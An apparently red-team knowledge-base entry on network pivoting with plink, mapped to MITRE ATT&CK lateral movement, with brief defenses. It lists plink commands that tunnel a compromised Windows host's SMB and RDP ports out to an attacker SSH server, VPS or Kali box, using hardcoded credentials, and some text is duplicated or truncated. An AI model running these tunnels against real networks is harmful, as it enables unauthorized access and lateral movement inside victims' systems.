---
id: a0f7c7fa-bd2b-4df5-84e9-e7c47f6e0255
name: Network Pivoting with plink Port Forwarding
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:23.009128+00:00'
updated_at: '2023-04-10T20:25:11.678785+00:00'
tactics:
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
- '[[Remote Services|T1021 - Remote Services]]'
sub_techniques:
- '[[Remote Desktop Protocol|T1021.001 - Remote Desktop Protocol]]'
- '[[SMB/Windows Admin Shares|T1021.002 - SMB/Windows Admin Shares]]'
tags:
- '[[Network Pivoting Techniques]]'
- '[[plink]]'
commands:
- '[[Expose RDP port on SSH server]]'
- '[[Expose SMB port on SSH server]]'
- '[[Forward port to VPS]]'
- '[[Redirect Windows port to Kali]]'
---

# Network Pivoting with plink Port Forwarding

## Summary

Network pivoting is a technique used by attackers to move laterally within a network. The plink command allows for port forwarding, which can be used to pivot traffic through a compromised host. This technique can be used to bypass perimeter defenses and gain access to internal resources.

Plink is

## Description

# Description

Network pivoting is a technique used by attackers to move laterally within a network. The plink command allows for port forwarding, which can be used to pivot traffic through a compromised host. This technique can be used to bypass perimeter defenses and gain access to internal resources.

Plink is a command-line tool for Windows that allows users to connect to a remote server securely. It can be used to create a secure tunnel between two hosts. Once the tunnel is established, traffic can be forwarded through the tunnel to bypass network restrictions.

The business value of this technique is that it allows attackers to gain access to internal resources and move laterally within a network. This can be used to steal sensitive data, disrupt operations, or launch further attacks.

## Requirements

1. Access to a compromised host

1. plink command-line tool

## Defense

1. Implement strong access controls to prevent unauthorized access to sensitive resources

1. Monitor network traffic for suspicious activity, such as traffic being forwarded through a tunnel

1. Use network segmentation to limit the impact of a compromised host

## Objectives

1. Gain access to internal resources

1. Move laterally within the network

# Instructions

1. The above commands are used to forward ports from a local machine to a remote machine through SSH. The -R option is used to specify the remote port to forward to and the local IP and port to forward from. The -L option can be used to specify the local port to forward to and the remote IP and port to forward from. The -P option specifies the SSH server port to connect to. The -l option specifies the username to use for the SSH connection. The -pw option specifies the password to use for the SSH connection.

**Code**: [[# exposes the SMB port of the machine in the port ]]

> In the first command, the SMB port of the local machine is forwarded to the SSH server on port 445. In the second command, the RDP port of the local machine is forwarded to the SSH server on port 3390. The third and fourth commands are examples of using the -R and -L options to forward ports. The fifth command is an example of forwarding a port on a VPS. The last command redirects the Windows port 445 to Kali on port 22.

**Command** ([[Expose SMB port on SSH server]]):

```bash
plink -l root -pw toor -R 445:127.0.0.1:445
```

**Command** ([[Expose RDP port on SSH server]]):

```bash
plink -l root -pw toor ssh-server-ip -R 3390:127.0.0.1:3389
```

**Command** ([[Forward port to VPS]]):

```bash
plink -R [Port to forward to on your VPS]:localhost:[Port to forward on your local machine] [VPS IP]
```

**Command** ([[Redirect Windows port to Kali]]):

```bash
plink -P 22 -l root -pw some_password -C -R 445:127.0.0.1:445 192.168.12.185
```

## MITRE ATT&CK Mapping

### Tactics

- [[Lateral Movement|TA0008 - Lateral Movement]]

### Techniques

- [[Remote Services|T1021 - Remote Services]]

### Sub-Techniques

- [[Remote Desktop Protocol|T1021.001 - Remote Desktop Protocol]]
- [[SMB/Windows Admin Shares|T1021.002 - SMB/Windows Admin Shares]]

## Commands Used

- [[Expose RDP port on SSH server]]
- [[Expose SMB port on SSH server]]
- [[Forward port to VPS]]
- [[Redirect Windows port to Kali]]

## Tags

- [[Network Pivoting Techniques]]
- [[plink]]
